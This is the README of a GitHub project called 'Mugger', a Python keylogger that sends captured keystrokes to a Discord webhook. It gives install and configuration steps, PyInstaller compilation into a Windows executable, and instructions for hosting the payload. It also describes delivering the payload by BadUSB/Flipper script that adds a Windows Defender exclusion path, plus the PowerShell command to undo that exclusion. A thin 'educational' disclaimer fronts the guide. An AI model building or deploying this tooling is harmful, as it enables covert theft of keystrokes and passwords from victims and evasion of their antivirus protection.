# Mugger
Simple Python3 KeyLogger that sends to Discord Webhook

```
⠀⠀⠀⠀⣀⣤⡤⠤⠶⠤⢤⣄⣀⠀⠀⠀
⠀⢀⡴⠛⣉⣠⣤⣴⣶⠶⣤⣄⡉⠳⢄⠀
⠀⢀⣴⠞⢹⠃⢰⣿⣧⣀⡄⠙⡟⢷⡀⠀
⢠⣾⠁⠀⢸⡄⠘⠿⣿⠿⠃⢰⠇⠀⢻⣄    KeyLogger o-[==> Mugger
⠹⠿⣤⡀⠀⠙⠶⢤⣤⡤⠖⠃⢀⣠⡾⠟
⠀⠀⠀⢉⠛⠒⠶⠶⠶⠶⠶⠚⢋⠁⠀⠀
⠀⠀⢰⠟⣆⠀⠀⣠⢷⡀⠀⢀⡞⢧⠀⠀
⠀⠀⣟⠀⣹⠀⢰⠏⠈⢷⠀⢸⡁⢘⡇⠀
⠀⠀⠈⠛⠁⠀⢸⡰⡀⣸⠂⠀⠙⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠛⠁⠀⠀⠀⠀⠀⠀
```

# Disclaimer
This utility is strictly for educational and/or purposes of which an employer has authority to do so.
The user, YOU, are responsible for the usage of such utility. With that said, use it wisely and legally.

# Prerequisites
```
1. Python3
2. Discord Webhook
```

# Install
```
git clone https://github.com/CharlesTheGreat/Mugger

# for pyvenv (optional)
python3 -m venv <any_name>
source <any_name>/bin/activate

# required
pip3 install -r requirements
```

# Quick Start
* Change in the Mugger.py file:
        discord = "DISCORD_WEBHOOK"
        -       to your discord webhook

        timer = 60
        -       to the length of seconds of your wish



# Compile
* When compiling as an executable, be sure you're on Windows for a Windows payload!! (Common Sense, as MacOS compiled payload will not run on a Windows!)
```
python3 -m PyInstaller Mugger.py --onefile
```
* After compiling:
        - Inside the /dist directory is your exe file
        
# Upload
* Upload exe to a server, local python server, etc... do as you will.

# BADUSB
* Edit the line "LINK_TO_EXE" to the link to your newly created exe file.
        - This script sets an exclusion for C:\temp!!!!!!
        - When you are done, be sure to reset the exclusion path!!!!!!!!
* Reset Exclusion Path for Badusb script when finished
```
Remove-MpPreference -ExclusionPath "C:\temp"
```
OR 
run ExclusionRemove.txt file with flipper
